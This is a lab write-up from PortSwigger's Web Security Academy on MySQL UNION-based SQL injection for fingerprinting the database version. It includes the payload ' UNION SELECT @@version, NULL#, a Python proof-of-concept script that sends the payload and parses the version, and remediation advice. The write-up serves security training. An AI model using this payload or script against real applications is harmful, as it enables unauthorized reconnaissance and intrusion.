# SQL Injection Attack, Querying the Database Type and Version on MySQL
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-21

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Accessories'
```

Unlike Oracle (which required querying the `v$version` system view — see lab 7), MySQL exposes its version through a simple built-in variable, `@@version`, that can be selected directly like a column value.

## Discovery / Exploitation
The version string can be pulled straight into the UNION result using `@@version` in place of a real column:

```
' UNION SELECT @@version, NULL#
```

Resulting query:
```sql
SELECT * FROM products WHERE category = 'Accessories' UNION SELECT @@version, NULL#'
```

Here `#` is used as the comment marker instead of `--`, which is also valid in MySQL and avoids some edge cases with trailing space requirements. The response includes a version string in the classic MySQL format (e.g. `8.0.31-0ubuntu0.20.04.1`), which is located using a regex pattern that matches the `X.X.X` version number shape.

## Impact
As with the Oracle version-fingerprinting lab, this doesn't extract application data directly, but confirms the database engine as MySQL and reveals the exact version — useful for identifying known CVEs, understanding available syntax (e.g. `CONCAT()` vs `||`), and tailoring further injection payloads to the specific engine.

## Proof of Concept (Python)
This script sends the `@@version` UNION payload through Burp Suite (`127.0.0.1:8080`), then uses BeautifulSoup with a regex pattern matching a typical version number format (`\d{1,2}\.\d{1,2}\.\d{1,2}`) to locate and print the version string.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_version(url):
    path = "/filter?category=Accessories"
    sql_payload = "'+UNION+select+@@version,NULL%23"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    version = soup.find(string=re.compile(r'.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if version is None:
        return False
    else:
        print("the database version is: " + version)
        return True


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage : %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of database...")
    if not exploit_sqli_version(url):
        print("[-] could not dump the version of database")
```

**How it works:**
1. Takes the target URL as a command-line argument
2. Sends a `UNION SELECT @@version, NULL` payload (with `%23` — the URL-encoded `#`) to the vulnerable `category` parameter
3. Parses the response with BeautifulSoup and searches for text matching a version-number pattern (digits separated by periods)
4. Prints the matched version string if found, or reports failure if no matching pattern was located

**Example run:**
```bash
python3 exploit_sqli_db_version_mysql.py https://your-lab-url.web-security-academy.net
```

**Note on comment syntax:** MySQL supports both `--` (with a trailing space) and `#` as comment markers. `#` is often more convenient in URL payloads since it needs no trailing space — just URL-encode it as `%23`.

## Remediation
- Use **parameterized queries (prepared statements)** — the standard defense against injection at every stage, including reconnaissance-only payloads like this.
- Avoid exposing **version banners, error messages, or other environment details** to end users anywhere in the application, not just through injectable fields.
- Apply the **principle of least privilege** to the database account used by the application.

## Takeaway
This lab is the MySQL counterpart to lab 7's Oracle version fingerprinting — same goal, different syntax. Comparing the two: MySQL's `@@version` is a one-line built-in accessible directly in a `SELECT`, while Oracle requires querying a system view (`v$version`). Recognizing which syntax a target accepts is itself a fast way to identify the underlying database engine before any version string is even read.
